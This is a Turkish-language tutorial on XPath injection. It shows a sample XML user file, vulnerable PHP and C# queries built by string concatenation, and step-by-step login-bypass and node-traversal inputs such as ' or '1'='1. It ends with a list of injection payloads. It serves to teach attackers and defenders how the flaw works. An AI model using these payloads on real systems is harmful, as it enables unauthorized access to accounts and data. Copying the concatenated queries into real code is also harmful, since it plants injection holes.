@@ -1,0 +1,155 @@
+XPath (XML Path Language) XML türündeki dokümanlar içerisinde düğüm(node) seçimi ve işlemleri için kullanılan özelleşmiş bir sorgu dilidir. Nasıl SQL dili belirli veri tabanlarında işlem yapmaya olanak tanıyorsa XPath’de benzer şekilde fakat kısıtlı imkanlarla (mesela Xpath ile doğrudan güncelleme yapılamaz) XML dokümanlarında sorgu yapmaya olanak tanıyor. Eğer bir uygulama herhangi bir XML dokümanı içerisinde yapacağı XPath sorgusunda, kullanıcı tarafından alınan girdileri filtrelemeden kullanıyorsa, SQL Injection zafiyetine benzer şekilde XPath Injection zafiyeti oluşur. Saldırgan, kasıtlı olarak hatalı biçimlendirilmiş bilgileri uygulamaya göndererek, XML verilerinin nasıl yapılandırıldığını bulabilir veya normalde erişemeyeceği verilere erişebilir.  XML dosyası bir web sitesinde kimlik doğrulaması için kullanılıyorsa (XML tabanlı bir kullanıcı dosyası gibi), web sitesindeki ayrıcalıklarını yükseltebilir.
+ 
+XPath standart bir dildir; gösterimi / sözdizimi daima uygulamadan bağımsızdır, bu da saldırganın uygulamada kullanılan dilden bağımsız olarak veriler Xpath sözdizimine uygun şekilde manipüle edebileceği anlamını taşır.
+ 
+Seviye erişim kontrolü Xpath sorgularında olmadığı için tüm dokümana erişmek mümkündür. SQL saldırılarından bildiğimiz gibi herhangi bir sınırlama ile -uygulama tabanlı yapılmadığı sürece - karşılaşmayız.
+ 
+XML Veritabanı Ağaç Yapısı ve Örneği
+XML yapısında veri tutulması durumunda, nodelara erişiminde ve farklı kullanıcılar için farklı erişim seviyeleri bulunmamaktadır. Gerekli önlem alınmadığı takdirde yapılan herhangi bir XPath sorgusu ile tüm XML dokümanına erişebilir. Bu da, uygulamada XPath açığı bulunması halinde saldırganın tüm XML veri tabanını ele geçirebilmesi anlamına gelmektedir.
+ 
+Bu saldırı yöntemine sebep olan durumları, teknikleri ve saldırının oluşturacağı sonuçları hem yazılım geliştirici hem de sistem yöneticisi iyi bir şekilde bilmeli ve sistemin güvenliği için gerekli önlemleri almalıdırlar.
+ 
+Örneğin kullanıcı bilgilerini tutmak için, ID, kullanıcı adı, parola ve bilgi değerlerini tutan örnek bir XML dokümanı aşağıdaki gibidir:
+ 
+<?xml version="1.0" encoding="UTF-8"?>
+<kullanicilar>
+<kullanici>
+<id>1</id>
+<kullaniciAdi>admin</kullaniciAdi>
+<parola>kesinlikleadmin</parola>
+<bilgi>admin</bilgi>
+</kullanici>
+<kullanici>
+<id>2</id>
+<kullaniciAdi>root</kullaniciAdi>
+<parola>toor</parola>
+<bilgi>En üst yetki</bilgi>
+</kullanici>
+<kullanici>
+<id>3</id>
+<kullaniciAdi>Mustafa</kullaniciAdi>
+<parola>mustafa</parola>
+<bilgi>yeni kullanici</bilgi>
+</kullanici>
+</kullanicilar>
+ 
+Örnek olarak farklı dillerde yapılan sorgular aşağıdaki gibidir ( bu sorgular programlama dilline göre XML içeriğinde sorgu yapılabilecek şekilde kod yazdıktan sonra sorgu olarak ilgili fonksiyona / objeye gönderilir). Username ve Password kulanıcıdan alınan parametrelerdir.
+ 
+Örnek sorgu (PHP)
+"/kullanicilar/kullanici[kullaniciAdi='" . $Username . "' and parola='" . $Password . "']"
+ 
+C# , VB sorgusu:
+"/kullanicilar/kullanici[kullaniciAdi/text()='" & Request("Username") & "' And parola/text()='" & Request("Password") & "']"
+ 
+ 
+Xpath Injection Saldırı Açıklaması
+Bu bölümde yukarıda örnek olarak verilen XML dokümanına erişim yapan örnek bir uygulamayı kullanacağız.
+ 
+ 
+xpath injection 
+Yukarıdaki gibi bir giriş sayfamız var ve bu sayfa kullanıcı adı ve parola girildiğinde size bilgilerinizi veriyor.
+ 
+Bu sayfaya giriş yapmaya çalıştığında kullanıcı adı:xpath parola:xpathi girilmiş olsun
+ 
+"/kullanicilar/kullanici[kullaniciAdi='" . xpath . "' and parola='" . xpathi . "']"
+ 
+Şeklinde bir sorgu oluşturulup sunucuda çalıştırılacaktır. Sonuç aşağıdaki gibi:
+xpath injection 
+ 
+ 
+ 
+Bu sorgudaki kullanıcı ve parola değerleri XML dokümanında olmadığı için “Yanlış kullanıcı adı veya şifre”    diye yanıt döndü.
+ 
+ 
+Gelelim senaryolarımıza;
+ 
+1 ) Saldırgan Mustafa’nın hesabına girmeye çalışıyor olsun sadece kullanıcı adını biliyor ve parolayı bilmiyor ;
+ 
+Saldırganın girdiği değerler;
+Kullanıcı Adı : Mustafa
+Parola : Parola ’ or ‘1’ = ‘1
+ 
+Değerleri girildiğinde sunucuya şu sorgu gönderilir:
+"/kullanicilar/kullanici[kullaniciAdi='Mustafa' and parola='Parola ' or '1'='1']"
+ 
+Burda yaptığımız aslında yazılımı yazan kişinin açtığı tırnakları biz kapatıp , kapattıklarını ise biz açıyoruz.
+ 
+(kullanici='" . Mustafa’) = True
+(parola = Parola) = False
+ (‘1’ = ‘1’) = True
+True and (False or True)  -> True and True -> True olacaktır ve mustafa(kurban) bilgileri ile giriş yapmış olacağız.
+ 
+xpath injection 
+ 
+Xpath sorgulamada yorum satırı “< >” tag’leri arasına yazılır. SQL Injectionda olduğu gibi “ – – “ karakterlerinden sonra yazılan mesela şifrenin bilinmemesinden kaynaklanan False değeri, yorum satırı haline getirilip elenemez. Bunun yerine “ 1=1 ” gibi “True” bir ifadeyle “and” işleminin “or” işlemine göre önce işleme alınması kullanılarak False olan şifre değeri elenir ve bu şekilde sisteme girişi yapmış oluruz.
+ 
+ 
+ 
+2 ) Saldırgan herhangi bir kullanıcı adı veya şifre bilmiyorsa;
+ 
+Saldırganın girdiği değerler;
+Kullanıcı Adı : farketmez' or '1'='1
+Şifre : farketmez' or '1'='1
+ 
+Değerleri girildiğinde sunucuya şu sorgu gönderilir:
+"/kullanicilar/kullanici[kullaniciAdi='" . farketmez' or '1'='1 . "' and parola='" . farketmez' or '1'='1 . "']"
+ 
+(kullanici='" . farketmez') = False
+('1'='1’) = True
+ (‘1’ = ‘1’) = True
+(parola = farketmez' or '1'='1) = False
+(False or True) and (False or True)  -> True or True -> True olacaktır
+Bu sayede ilk kullanıcının bilgilerini ele geçirmiş olacağız.
+ 
+ 
+xpath injection 
+ 
+Diğer Sorgu Örnekleri
+Bir nodun pozisyonuna göre seçim yapma için XPath'de position kullanılabilir.
+
+Saldırganın girdiği değerler;
+Kullanıcı Adı : Mustafa
+Şifre : ' or '1'='1']/../kullanici[position()=’2
+ 
+Değerleri girildiğinde sunucuya şu sorgu gönderilir:
+"/kullanicilar/kullanici[kullaniciAdi='" . Mustafa . "' and parola='" . mustafa’]/../kullanici[position()=’2 . "']" 
+ 
+Daha kolay anlaşılması için burayı 3 parçaya ayırıyorum ;
+1) Burada ‘] ile yazılımı yazan kişinin açtığı tırnak ve köşeli parantezleri biz kapatıyoruz 
+2) /../ ile bir üst dizine çıkıyoruz ve sorguda görüldüğü gibi işlemleri /kullanicilar/kullanici üzerinden yapıyoruz
+Biz de bu dizinden işlem yapacağız fakat istediğimiz işlemi şuan yapamıyoruz
+3) Burda kullanici[position()=’2 ile yeni sorgu oluşturuyoruz
+ 
+xpath injection 
+ 
+ 
+Ayrıca parent:: ve child:: değerli seçilini nodun bir üstüne veya alt nodelarını seçmek için kullanılabilir. Poisition ile birlikte döküman üzerinde gezilebilir. parent::[position()=2] ile bir üst node'ın ikinici elemanı  ya da child::[position()=3] bir alt nodlardan üçüncü eleman gibi.
+ 
+Eğer zafiyet blind olarak tetiklenecekse  substring ve name fonksiyonları kullanılabilir. 
+ 
+Örneğin substring(name(child::[position()=3),1,1)='S' sorgusu bir alt nodlardan üçüncü elemanın adının ilk harfinin S olması durumunda True döner. D
+ 
+Xpath fonksiyonların tamamına aşağıdaki bağlantıdan ulaşabilirsin, payload yazarken bu fonksiyonları da kullanabilirsiniz.
+ 
+https://way2tutorial.com/xml/xpath_functions_with_examples.php
+ 
+Deneyebileceğiniz XPath payloadları aşağıdadır .
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
+ 
+ 
+Kaynaklar:
+ 
+https://github.com/infosec-au/fuzzdb/blob/master/attack-payloads/xpath/xpath-injection.fuzz.txt
+https://tipstrickshack.blogspot.com/2013/11/xpath-injection-tutorial.html
